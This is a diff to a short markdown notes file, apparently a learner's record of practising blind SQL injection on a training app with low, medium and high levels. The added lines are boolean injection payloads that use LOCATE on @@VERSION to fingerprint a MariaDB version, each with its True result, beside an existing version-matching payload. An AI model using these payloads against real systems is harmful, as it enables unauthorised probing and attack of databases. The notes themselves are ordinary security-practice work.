@@ -73,8 +73,19 @@
 - `1' AND @@VERSION="10.4.17-MariaDB";-- -` this worked
 
 ## Medium
--
+```
+1 AND LOCATE(10,@@VERSION); -- -	-> True
 
+
+1 AND LOCATE(10.4,@@VERSION); -- -	-> True
+
+
+1 AND LOCATE(4.1,@@VERSION); -- -	-> True
+
+1 AND LOCATE(4.17,@@VERSION); -- -	-> True
+
+```
+- Still gotta find a way to brute check string part of version.
 
 ## High
 - `1' AND @@VERSION="10.4.17-MariaDB";-- -` this worked
